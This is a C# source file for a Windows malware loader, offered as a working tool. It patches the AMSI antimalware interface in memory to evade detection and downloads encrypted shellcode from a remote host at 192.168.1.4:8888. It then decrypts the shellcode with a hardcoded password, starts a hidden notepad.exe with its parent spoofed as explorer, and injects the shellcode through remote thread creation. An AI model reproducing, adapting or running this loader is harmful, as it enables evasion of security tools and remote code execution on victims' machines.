
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Diagnostics;

// this where All the Windows API functions and variables needed to
// execute the shellcode will be defined
public class Win32
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFOEX
	{
		public STARTUPINFO StartupInfo;
		public IntPtr lpAttributeList;
	}
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFileAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;
		public IntPtr lpSecurityDescriptor;
		[MarshalAs (UnmanagedType.Bool)]
		public bool bInheritHandle;
	}
	[Flags]
	public enum ProcessAccessFlags : uint
	{
		All = 0x001F0FFF,
		Terminate = 0x00000001,
		CreateThread = 0x00000002,
		VirtualMemoryOperation = 0x00000008,
		VirtualMemoryRead = 0x00000010,
		VirtualMemoryWrite = 0x00000020,
		DuplicateHandle = 0x00000040,
		CreateProcess = 0x00000080,
		SetQuota = 0x00000100,
		SetInformation = 0x00000200,
		QueryInformation = 0x00000400,
		QueryLimitedInformation = 0x00001000,
		Synchronize = 0x00100000
	}
	[DllImport("kernel32")]
	public static extern bool FreeLibrary(IntPtr hModule);
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
	[DllImport("kernel32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
	[DllImport("kernel32.dll")]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	[DllImport("kernel32.dll")]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	 [DllImport("Kernel32")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // Variables
        public static int PROCESS_CREATE_THREAD = 0x0002;
        public static int PROCESS_QUERY_INFORMATION = 0x0400;
        public static int PROCESS_VM_OPERATION = 0x0008;
        public static int PROCESS_VM_WRITE = 0x0020;
        public static int PROCESS_VM_READ = 0x0010;
        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
        public static UInt32 PAGE_READWRITE = 0x04;
        public static int SW_HIDE = 0;
}
public class Evasion
{
	//ASB Patches
	static byte[] amsix64 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
	static byte[] amsix86 = new byte[] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18,0x00};
	// EtwEventWrite Patches

	public static void PatchAMS()
	{
		string dll1 = "am";
		string dll2 = "si";
		string dll0 = ".dll";
		string dll = dll1 + dll2 + dll0;

		if (IntPtr.Size == 8)
		{
			PatchMem(amsix64, dll, "DllGetClassObject", 0xcb0);
		}
		else
		{
			PatchMem(amsix86, dll, "DllGetClassObject", 0x970);
			
		}
	}
	private static void PatchMem(byte[] patch, string library, string function, Int64 offset = 0)
	{
		try
		{
			uint newProtect;
			uint oldProtect;
			// Get library address
			IntPtr libPtr = Win32.LoadLibrary(library);
			// Get Function address
			IntPtr functionPtr = Win32.GetProcAddress(libPtr, function);
			// Jump to the real function address if offset is used
			if (offset != 0)
			{
				functionPtr = new IntPtr(functionPtr.ToInt64() + offset);
			}
			// Change memory permissions to XRW
			Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
			// Patch function
			Marshal.Copy(patch, 0, functionPtr, patch.Length);
			// Restore memory permissions
			Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
			Win32.FreeLibrary(libPtr);

		}
		catch (Exception e)
		{
			Console.WriteLine("[!] {0}", e.Message);
			Console.WriteLine("[!] {0}", e.InnerException);
		}
	}
}
public class Decrypt
{
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
                byte[] decryptedBytes = null;
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                        using (RijndaelManaged AES = new RijndaelManaged())
                        {
                                AES.KeySize = 256;
                                AES.BlockSize = 128;

                                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                                AES.Key = key.GetBytes(AES.KeySize / 8);
                                AES.IV = key.GetBytes(AES.BlockSize / 8);

                                AES.Mode = CipherMode.CBC;

                                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                                {
                                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                                        cs.Close();
                                }
                                decryptedBytes = ms.ToArray();
                        }
                }

                return decryptedBytes;
        }
}

public class Program
{
	public static int SpoofParent(int parentProcessId, string binaryPath)
	{
		// STARTUPINFOEX members
		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
		// STARTUPINFO members (dwFlags and wShowWindow)
		const int STARTF_USESTDHANDLES = 0x00000100;
		const int STARTF_USESHOWWINDOW = 0x00000001;
		const short SW_HIDE = 0x0000;
		// dwCreationFlags
		const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
		const uint CREATE_NO_WINDOW = 0x08000000;
		// Structs
		var pInfo = new Win32.PROCESS_INFORMATION();
		var siEx = new Win32.STARTUPINFOEX();
		// Vars
		IntPtr lpValueProc = IntPtr.Zero;
		IntPtr hSourceProcessHandle = IntPtr.Zero;
		var lpSize = IntPtr.Zero;
		// Initializes the specified list of attributes for process and thread creation
		Win32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
		// Allocates memory from the unmanaged memory of the process.
		siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
		Win32.InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);
		// Opens the parent process with CreateProcess and DuplicateHandle permissions
		IntPtr parentHandle = Win32.OpenProcess(Win32.ProcessAccessFlags.CreateProcess | Win32.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
		// Allocates memory from the unmanaged memory of the process
		lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
		// Writes the parentHandle address into lpValueProc
		Marshal.WriteIntPtr(lpValueProc, parentHandle);
		// Updates the StartUpInfo lpAttributeList PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
		// With the value of the Parent Process to spoof (lpValueProc)
		Win32.UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
		// StartupInformation flags
		siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		siEx.StartupInfo.wShowWindow = SW_HIDE;
		// Create new Process and Thread security Attributes
		var ps = new Win32.SECURITY_ATTRIBUTES();
		var ts = new Win32.SECURITY_ATTRIBUTES();
		ps.nLength = Marshal.SizeOf(ps);
		ts.nLength = Marshal.SizeOf(ts);
		// Creates the process with modified STARTINFO
		bool ret = Win32.CreateProcess(binaryPath, null, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
		if (!ret) { return 0; }
		return pInfo.dwProcessId;
	}
	public static void InjectShellCode(int remoteProcId, byte[] shellcode)
	{
		
		// Opens the target process
		IntPtr procHandle = Win32.OpenProcess(Win32.PROCESS_CREATE_THREAD | Win32.PROCESS_QUERY_INFORMATION | Win32.PROCESS_VM_OPERATION | Win32.PROCESS_VM_WRITE | Win32.PROCESS_VM_READ, false, remoteProcId);
		// Allocate memory with PAGE_READWRITE permissions
		IntPtr spaceAddr = Win32.VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
		// Write shellcode into memory
		Win32.WriteProcessMemory(procHandle, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);
		// Change memory permissions to PAGE_EXECUTE_READ
		uint oldProtect;
		Win32.VirtualProtectEx(procHandle, spaceAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);
		// Create a new thread to execute shellcode
		IntPtr threatH = Win32.CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
		return;
	}
	public static int GetPid(string procName)
        {
                int remoteProcId = 0;
                Process[] procs = Process.GetProcesses();
                foreach (Process proc in procs)
                {
                        if (proc.ProcessName == procName)
                        {
                                remoteProcId = proc.Id;
                                break;
                        }
                }

                return remoteProcId;
        }
	public static byte[] downloader(string shellcode_url)
        {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 blalalala)");
                // this header just another header
                //ServicePointManager.Excpect100Continue = true;
                // selects the version of tls to use
                //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                // Ignore Certificate Check, remove on production!
                // check stackovflow for "how to ignore the certificate check when ssl" question
                //ServicePointManager.ServerCertificateValidationCallback = delegate {return true};
               // End of ignore Certificate Check
               byte[] shellcode = wc.DownloadData(shellcode_url);
               return shellcode;
        }
	public static void Main(string[] args)
        {
		Evasion.PatchAMS();
		int parentProcessId = GetPid("explorer");
		string binaryPath = @"C:\\Windows\\System32\\notepad.exe";
		string url = "http://192.168.1.4:8888/shellcode.bin_enc";
		byte[] shellcode = downloader(url);
		byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("DtGvFck#"));
		shellcode = Decrypt.AES_Decrypt(shellcode, password);
		Console.WriteLine("[<] {0} Bytes Downloaded! ", shellcode.Length);
		Console.WriteLine("[+] Launching {0} with PPID: {1}", binaryPath, parentProcessId);
		int remoteProcessId = SpoofParent(parentProcessId, binaryPath);
		Console.WriteLine("[>] Injecting shellcode in PID: {0}", remoteProcessId);
		InjectShellCode(remoteProcessId, shellcode);
	}
}
